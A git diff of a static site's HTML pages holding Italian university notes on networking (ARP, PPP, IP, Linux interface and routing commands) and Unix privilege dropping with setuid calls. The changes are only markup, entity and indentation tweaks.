@@ -231,7 +231,7 @@ Dungeons and Dragons, Boardgames.</p>
 </li>
 </ul>
 <!-- raw HTML omitted -->
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> #\##|   |
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> #\##|   |
 ##\\ |   |
    \\|   \&#39;---&#39;/
     \   _&#39;.&#39;O&#39;.&#39;
@@ -397,7 +397,7 @@ legge fino al livello 3, quindi fino all&rsquo;indirizzo IP!</p>
 
 
 <p>Tuttavia esistono delle eccezioni, come gli switch di livello 3, quindi
-anche qua c'è flessibilità.</p>
+anche qua c&rsquo;è flessibilità.</p>
 <p><strong>Deep packet inspection:</strong> &ndash;&gt; quando si parla di dispositivi che sono in
 grado di analizzare più in profondità i pacchetti: riesce a leggere informazioni
 anche a livelli più alti dello stack.</p>
@@ -463,7 +463,7 @@ per entrambe le direzioni (nel caso di un punto a punto).</li>
 </ul>
 </li>
 </ol>
-<p>E&rsquo; importante capire bene la differenza tra <strong>modalità di trasmissione</strong> e
+<p>E' importante capire bene la differenza tra <strong>modalità di trasmissione</strong> e
 <strong>tipi fisici di collegamento</strong>. Infatti, a prescindere dal mezzo, un
 protocollo può prevedere molteplici modalità di trasmissione.</p>
 </li>
@@ -648,7 +648,7 @@ I pacchetti usati per richieste / risposte ARP sono pacchetti
 Per questo è un &ldquo;sottoprotocollo&rdquo; dell&rsquo;Ethernet.</p>
 <p>Il fatto che non sia riuscito ad ottenere l&rsquo;indirizzo MAC
 del destinatario (nel caso in cui effettivamente non ci sia),
-è un&rsquo;informazione implicita che si ottiene grazie ad un &ldquo;<strong>timeout</strong>&quot;.</p>
+è un&rsquo;informazione implicita che si ottiene grazie ad un &ldquo;<strong>timeout</strong>&rdquo;.</p>
 </li>
 <li>
 <p><strong>ARP Table</strong>: cache che conserva il mapping IP-MAC per
@@ -879,9 +879,9 @@ appositamente pensato per collegamenti punto-punto nell&rsquo;accesso residenzia
 ad esempio nelle connessioni cablate xDSL.</p>
 <ol>
 <li><strong>Modularità</strong>: supporta molti protocolli nei livelli superiori.</li>
-<li>Supporto all&rsquo;<strong>autenticazione</strong>: garanzia non scontata a livello di sicurezza!</li>
+<li>Supporto all'<strong>autenticazione</strong>: garanzia non scontata a livello di sicurezza!</li>
 <li><strong>Rilevamento di errori</strong> (non risoluzione), molto importante in quasi ogni protocollo.</li>
-<li>Supporto all&rsquo;<strong>IP Dinamico</strong>:</li>
+<li>Supporto all'<strong>IP Dinamico</strong>:</li>
 </ol>
 <p><strong><code>Metodo di incapsulazione</code></strong>: PPP deve saper ricevere pacchetti di varia natura
 e trasmetterli correttamente. 2 componenti principali: (<em>i</em>) Link Control Protocol e
@@ -947,7 +947,7 @@ quest&rsquo;ultima in diverse fasi (Figura 6)</p>
 <p>Tecnica che si usa per distinguere il byte &lt;01111110&gt; &ldquo;flag&rdquo; dallo
 stesso byte se è un dato logico. Per farlo, aggiunge un byte extra analogo
 prima di ogni byte (&lt;01111110&gt;) dato.
-E&rsquo; una sorta di operazione di &ldquo;escaping&rdquo;: il destinatario se trova due byte
+E' una sorta di operazione di &ldquo;escaping&rdquo;: il destinatario se trova due byte
 (&lt;01111110&gt;) di fila, scarta il primo, il secondo lo considera &ldquo;dato&rdquo; e
 continua la ricezione.</p>
 <hr>
@@ -982,7 +982,7 @@ Al contrario, noi utenti, spesso usiamo dei protocolli per ottenere l&rsquo;indi
 Ovviamente, assegnamo l&rsquo;indirizzo IP ad un&rsquo;interfaccia di rete. Tuttavia, ogni interfaccia
 può avere diversi indirizzi IP.</p>
 <ul>
-<li>Perchè c'è bisogno anche di un indirizzo fisico oltre all&rsquo;indirizzo logico? &ndash;&gt; per
+<li>Perchè c&rsquo;è bisogno anche di un indirizzo fisico oltre all&rsquo;indirizzo logico? &ndash;&gt; per
 motivi di performance: in modo da poter &ldquo;delegare&rdquo; all&rsquo;hardware alcune funzionalità
 specifiche (il filtraggio, ad esempio)! Queste stesse funzionalità potrebbero
 anche essere gestite a più alto livello, ma potrebbero risultare più lente essendo
@@ -1041,7 +1041,7 @@ essere usati localmente senza autorizzazione.
 </li>
 </ul>
 <p><strong><code>Natting</code></strong> &ndash;&gt; se ho una rete privata ma voglio comunicare con una rete
-esterna, che magari non accetta gli indirizzi IP locali. E&rsquo; una funzione
+esterna, che magari non accetta gli indirizzi IP locali. E' una funzione
 offerta dal router locale.
 📃 <a href="https://theelandor.github.io/prova/reti/ip_header_nat.html">Approfondimento Natting</a></p>
 </li>
@@ -1137,7 +1137,7 @@ sequenza lunga 8 bit.</li>
 può percorrere prima di essere scartato.</li>
 <li><strong>Protocol</strong> &ndash;&gt; contiene informazioni verso il livello 4, indica quale
 protocollo può usare i dati contenuti nel datagram.</li>
-<li><strong>Checksum</strong> &ndash;&gt; controllo di integrità sull&rsquo;<em>header</em>, quindi non ci si
+<li><strong>Checksum</strong> &ndash;&gt; controllo di integrità sull'<em>header</em>, quindi non ci si
 preoccupa per ora del payload. (Come al solito, in IP ci si mantiene
 il più leggeri possibili).</li>
 <li><strong>Ip-options</strong> &ndash;&gt; campo opzionale di grandezza variabile, serve per fare
@@ -1200,7 +1200,7 @@ tra processi locali.</p>
 <p>Si usa il comando <strong>ip</strong> per interagire con lo stack TCP/IP. Per lavorare
 a livello 2 si usa il comando <strong>ip link</strong>. Esso elenca tutte le interfacce
 di rete disponibili nel sistema, simile al comando <code>ifconfig -a</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">eros@eros-ThinkPad-T430:~/website$ ip link
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">eros@eros-ThinkPad-T430:~/website$ ip link
 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN mode DEFAULT group default qlen <span style="color:#ae81ff">1000</span>
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 2: enp0s25: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc fq_codel state DOWN mode DEFAULT group default qlen <span style="color:#ae81ff">1000</span>
@@ -1226,11 +1226,11 @@ di rete disponibili nel sistema, simile al comando <code>ifconfig -a</code>.</p>
 Eseguire questo comando corrisponde anche all&rsquo;accensione dell&rsquo;interfaccia.
 Dopo l&rsquo;esecuzione del comando, sull&rsquo;output di ifconfig compare la
 linea corrispondente alle informazioni degli indirizzi ip.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 192.168.1.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 192.168.1.1
 </code></pre></div><p>Per spegnere l&rsquo;interfaccia e rimuovere l&rsquo;indirizzo ip:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 <span style="color:#ae81ff">0</span> down
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 <span style="color:#ae81ff">0</span> down
 </code></pre></div><p>Per vedere gli indirizzi assegnati ad un interfaccia:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show dev eth0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show dev eth0
 ifconfig eth0
 </code></pre></div><p>Per aggiungere un indirizzo ip  ad un interfaccia.
 In questo caso devo sia assegnare l&rsquo;indirizzo che attivare l&rsquo;interfaccia.
@@ -1239,14 +1239,14 @@ Il comando ip è pensato per gestire più indirizzi IP in una stessa
 interfaccia, quindi risulta più articolato.
 Usando il comando <code>ifconfig eth0 0 down</code> viene spenta l&rsquo;interfaccia
 e rimosso soltanto <em>il primo</em> indirizzo ip.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr add dev eth0 192.168.1.1/24
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr add dev eth0 192.168.1.1/24
 </code></pre></div></li>
 <li>
 <p>Dopo aver acceso le interfacce e aver assegnato l&rsquo;indirizzo IP,
 si può testare la connessione usando <code>ping</code>. Se questa operazione
-ha successo, si può consultare l&rsquo;<em>arp table</em> usando uno di questi
+ha successo, si può consultare l'<em>arp table</em> usando uno di questi
 due comandi:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arp
 Address                  HWtype  HWaddress           Flags Mask            Iface
 192.168.1.4              ether   02:04:06:1b:57:4b   C                     eth0
 192.168.1.3                      <span style="color:#f92672">(</span>incomplete<span style="color:#f92672">)</span>                              eth0
@@ -1265,7 +1265,7 @@ le configurazioni temporanee.</p>
 In questo modo le informazioni date configurano la rete come
 se fosse stato usato ifconfig. Ecco un semplice esempio di
 configurazione</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# cat /etc/network/interfaces
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# cat /etc/network/interfaces
 <span style="color:#75715e"># interfaces(5) file used by ifup(8) and ifdown(8)</span>
 <span style="color:#75715e"># Include files from /etc/network/interfaces.d:</span>
 source-directory /etc/network/interfaces.d
@@ -1290,7 +1290,7 @@ di eth0 si usa <code>ifdown eth0</code>;</li>
 <li>
 <p>TMUX</p>
 <p>Alcuni comandi utili per la gestione delle finestre:</p>
-<pre><code class="language-example" data-lang="example">- logout --&gt; ctrl-d
+<pre tabindex="0"><code class="language-example" data-lang="example">- logout --&gt; ctrl-d
 - modalità comandi --&gt; ctrl-b
 - detach --&gt; CMD + d
 - split verticale --&gt; CMD + %
@@ -1309,14 +1309,14 @@ di eth0 si usa <code>ifdown eth0</code>;</li>
 (i) -e sta per ethernet, in modo da limitarsi alle informazioni del livello 2.
 (ii) -i serve per specificare l&rsquo;interfaccia.
 Esempio di output:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# tcpdump -nei eth0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# tcpdump -nei eth0
 tcpdump: verbose output suppressed, use -v or -vv <span style="color:#66d9ef">for</span> full protocol decode
 listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
 10:53:49.007880 02:04:06:9c:eb:4a &gt; ff:ff:ff:ff:ff:ff, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Request who-has 192.168.1.2 tell 192.168.1.1, length <span style="color:#ae81ff">28</span>
 10:53:49.007905 02:04:06:1b:57:4b &gt; 02:04:06:9c:eb:4a, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Reply 192.168.1.2 is-at 02:04:06:1b:57:4b, length <span style="color:#ae81ff">2</span>
 </code></pre></div><p>Può essere utile anche il comando <code>arping</code>: il test di connessione
 viene effettuato mandando tante richieste ARP, consecutivamente.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arping -i eth0 192.168.1.2
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arping -i eth0 192.168.1.2
 root@m2:~# tcpdump -nei eth0
 tcpdump: verbose output suppressed, use -v or -vv <span style="color:#66d9ef">for</span> full protocol decode
 listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
@@ -1359,7 +1359,7 @@ Quindi gli indirizzi ip vanno da 192.168.1.1 a 192.168.1.254, perchè
 <code>ifconfig eth1 192.168.2.254/24</code></li>
 </ul>
 <p>Dato che H2 è il router, deve avere le due interfacce che appartengono alle
-due reti diverse. E&rsquo; prassi che il suo indirizzo IP parta dagli ultimi
+due reti diverse. E' prassi che il suo indirizzo IP parta dagli ultimi
 disponibili, in modo da essere riconoscibile ad occhio.</p>
 </li>
 </ul>
@@ -1384,7 +1384,7 @@ tabella è presente solo un record (quindi una regola di routing), applicabile a
 che iniziano con <strong>192.168.1.0</strong>.</p>
 <ul>
 <li>
-<p><strong>Destination</strong>: applico questa riga a tutti i pacchetti destinati all&rsquo;
+<p><strong>Destination</strong>: applico questa riga a tutti i pacchetti destinati all'
 indirizzo di rete specificato.</p>
 </li>
 <li>
@@ -1438,7 +1438,7 @@ esistono entry che specificano regole per questa destinazione.</p>
 <li>
 <p>da H1 configuro in modo diverso l&rsquo;interfaccia, usando <code>ip addr dev eth0 192.168.1.1</code>.
 &ndash;&gt; In questo caso, se poi se uso <code>ping 192.168.1.254</code>, ottengo <em>host unreachable</em>, perchè
-ip non capisce da solo qual'è la netmask! Infatti essa deve essere necessariamente
+ip non capisce da solo qual&rsquo;è la netmask! Infatti essa deve essere necessariamente
 specificata alla fine dell&rsquo;indirizzo. In tal caso viene aggiornata correttamente la route table e riesco
 a pingare un host che si trova sulla rete locale.
 Con ifconfig invece, anche se la netmask non viene specificata, lui interpreta il comando
@@ -1460,7 +1460,7 @@ Alla fine è come se usassi <code>ip add add dev eth0 10.0.0.1</code> senza spec
 ip diverso dal proprio esso viene scartato! Bisogna quindi configurare l&rsquo;host
 centrale in modo da farlo comportare come un router (che inoltra i pacchetti).
 In linux si può usare modificando un&rsquo;opzione del kernel:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </code></pre></div><p>Dopo aver fatto ciò, è importante &ldquo;istruire&rdquo; gli host di livello 3 della
 rete, in modo da fargli capire come raggiungere gli indirizzi ip &ldquo;esterni&rdquo;,
 non raggiungibili a livello 2.
@@ -1468,7 +1468,7 @@ Bisogna semplicemente aggiungere una regola di routing.</p>
 <p>Ci si posiziona su H1 e si lancia il seguente comando, con cui si specifica
 che per raggiungere la rete 2 si deve passare per il router con indirizzo
 <strong>192.168.1.254</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -net 192.168.2.0/24 gw 192.168.1.254
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -net 192.168.2.0/24 gw 192.168.1.254
 </code></pre></div>
   <figure class="left" >
     <img src="/ox-hugo/routerconfig.png"   />
@@ -1482,7 +1482,7 @@ che per raggiungere la rete 2 si deve passare per il router con indirizzo
 <ul>
 <li>
 <p>da H1 uso <code>ping 192.168.2.2</code></p>
-<p>&ndash;&gt; per prima cosa H1 cerca di capire qual'è l&rsquo;indirizzo del router, che
+<p>&ndash;&gt; per prima cosa H1 cerca di capire qual&rsquo;è l&rsquo;indirizzo del router, che
 risponde fornendo il suo indirizzo MAC. Dopo aver fatto ciò,
 invia un pacchetto con IP destinazione <strong>192.168.2.2</strong>, <em>al router</em>. Esso inoltra poi il pacchetto
 e cerca di inviare delle arp request, ovviamente non trovando l&rsquo;host
@@ -1525,11 +1525,11 @@ sua tabella di routing e non trova una rete compatibile, quindi
 rimanda indietro l&rsquo;errore.</li>
 </ul>
 <p>Per eliminare una regola di routing si possono usare i seguenti comandi:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route del -net default
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route del -net default
 route del -net 192.168.2.0/24
 </code></pre></div><p>Con il seguente comando si specifica una regola di routing per uno specifico
 host.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -host 192.168.1.254 dev eth0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">route add -host 192.168.1.254 dev eth0
 </code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
@@ -1540,13 +1540,13 @@ host.</p>
 Dopo <strong>post-up</strong> viene specificato un comando che viene eseguito <em>dopo</em>
 l&rsquo;attivazione dell&rsquo;interfaccia di rete.
 Con la specifica <strong>&ldquo;gateway&rdquo;</strong> semplicemente si specifica il default gateway.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0
 iface eth0 inet static
   address 192.168.1.1/24
   gateway 192.168.1.254
   post-up route add -net 192.168.2.0/24 gw 192.168.1.254
 </code></pre></div><p>Per configurare H2 invece:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0 eth1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">auto eth0 eth1
 iface eth0 inet static
   address 192.168.1.254/24
 
@@ -1591,7 +1591,7 @@ new concepts and things that you have never heard of before.</p>
 
 
 <h4 id="intro-e-disclaimer"><em>Intro e disclaimer</em><a href="#intro-e-disclaimer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
-<pre><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
+<pre tabindex="0"><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
 &quot;Cyber Phisical security&quot; del corso triennale di ingegneria informatica
 di Unimore (sede di Mantova).
 Verranno riassunte le parti più importanti/meno intuitive/semplici del materiale didattico,
@@ -1634,54 +1634,54 @@ alle credenziali effettive.</p>
 <ul>
 <li><code>geteuid</code> &ndash;&gt; ritorna l&rsquo;ID <strong>effettivo</strong> del processo invocante;</li>
 </ul>
-<p>Una pratica utile è l&rsquo;<strong>abbassamento dei privilegi</strong> (anche detto privilege-drop), utile
+<p>Una pratica utile è l'<strong>abbassamento dei privilegi</strong> (anche detto privilege-drop), utile
 per evitare l&rsquo;esecuzione di applicazioni interamente con privilegi di root.</p>
 <ul>
 <li>modalità <strong>permanente</strong> &ndash;&gt; <code>setuid(getuid())</code>;</li>
 <li>modalità <strong>temporanea</strong> &ndash;&gt; <code>seteuid(getuid())</code>;</li>
 </ul>
 <p>Nell&rsquo;esempio seguente vengono usati i concetti appena descritti.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]){
 
-    uid_t uid, euid;
-    uid_t priv_uid;
+	uid_t uid, euid;
+	uid_t priv_uid;
 
-    uid <span style="color:#f92672">=</span> getuid(); <span style="color:#75715e">// id reale del processo
-</span><span style="color:#75715e"></span>    euid <span style="color:#f92672">=</span> geteuid(); <span style="color:#75715e">// id effettivo del processo
-</span><span style="color:#75715e"></span>    priv_uid <span style="color:#f92672">=</span> euid; <span style="color:#75715e">// id saved
+	uid <span style="color:#f92672">=</span> getuid(); <span style="color:#75715e">// id reale del processo
+</span><span style="color:#75715e"></span>	euid <span style="color:#f92672">=</span> geteuid(); <span style="color:#75715e">// id effettivo del processo
+</span><span style="color:#75715e"></span>	priv_uid <span style="color:#f92672">=</span> euid; <span style="color:#75715e">// id saved
 </span><span style="color:#75715e"></span>
-    <span style="color:#75715e">// stampo id reale ed effettivo PRIMA del privilege drop (temporaneo)
-</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
-    printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
+	<span style="color:#75715e">// stampo id reale ed effettivo PRIMA del privilege drop (temporaneo)
+</span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
+	printf(<span style="color:#e6db74">&#34;Prima di seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
 
-    <span style="color:#66d9ef">if</span>(seteuid(uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
-        printf(<span style="color:#e6db74">&#34;Non sono riuscito ad abbassare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        exit(<span style="color:#ae81ff">1</span>);
-    }
+	<span style="color:#66d9ef">if</span>(seteuid(uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
+		printf(<span style="color:#e6db74">&#34;Non sono riuscito ad abbassare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		exit(<span style="color:#ae81ff">1</span>);
+	}
 
-    <span style="color:#75715e">// stampo id reale ed effettivo DOPO il privilege drop (temporaneo)
-</span><span style="color:#75715e"></span>    uid <span style="color:#f92672">=</span> getuid();
-    euid <span style="color:#f92672">=</span> geteuid();
+	<span style="color:#75715e">// stampo id reale ed effettivo DOPO il privilege drop (temporaneo)
+</span><span style="color:#75715e"></span>	uid <span style="color:#f92672">=</span> getuid();
+	euid <span style="color:#f92672">=</span> geteuid();
 
-    printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
-    printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
+	printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
+	printf(<span style="color:#e6db74">&#34;Dopo seteuid(uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
 
-    <span style="color:#66d9ef">if</span>(seteuid(priv_uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
-        printf(<span style="color:#e6db74">&#34;Non sono riuscito a ripristinare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        exit(<span style="color:#ae81ff">1</span>);
-    }
+	<span style="color:#66d9ef">if</span>(seteuid(priv_uid) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
+		printf(<span style="color:#e6db74">&#34;Non sono riuscito a ripristinare i privilegi.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		exit(<span style="color:#ae81ff">1</span>);
+	}
 
-    uid <span style="color:#f92672">=</span> getuid();
-    euid <span style="color:#f92672">=</span> geteuid();
+	uid <span style="color:#f92672">=</span> getuid();
+	euid <span style="color:#f92672">=</span> geteuid();
 
-    <span style="color:#75715e">// stampo id reale ed effettivo dopo il privilege restore
-</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
-    printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
+	<span style="color:#75715e">// stampo id reale ed effettivo dopo il privilege restore
+</span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID reale del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, uid);
+	printf(<span style="color:#e6db74">&#34;Dopo seteuid(priv_uid): UID effettivo del processo = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, euid);
 }
 </code></pre></div><p>Altre due chiamate di sistema per lavorare con gli UID:</p>
 <ul>
@@ -1689,14 +1689,14 @@ per evitare l&rsquo;esecuzione di applicazioni interamente con privilegi di root
 <li><code>setresuid</code> &ndash;&gt; per impostare tutti gli UID del processo;</li>
 </ul>
 <p>Privilege drop <strong>permanente</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>uid, uid, uid<span style="color:#f92672">)</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>uid, uid, uid<span style="color:#f92672">)</span>;
 </code></pre></div><p>In questo modo vengono abbassati permanentemente i privilegi del processo invocante.
 Essenzialmente &ldquo;blocco&rdquo; tutti gli UID a quelli specificati.</p>
 <p>Privilege drop <strong>temporaneo</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, getuid<span style="color:#f92672">()</span>, -1<span style="color:#f92672">)</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, getuid<span style="color:#f92672">()</span>, -1<span style="color:#f92672">)</span>;
 setresuid<span style="color:#f92672">(</span>-1, uid, -1<span style="color:#f92672">)</span> ≡ seteuid<span style="color:#f92672">(</span>uid<span style="color:#f92672">)</span>;
 </code></pre></div><p>Ripristino temporaneo dei privilegi:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, privileged_ID, -1<span style="color:#f92672">)</span>;
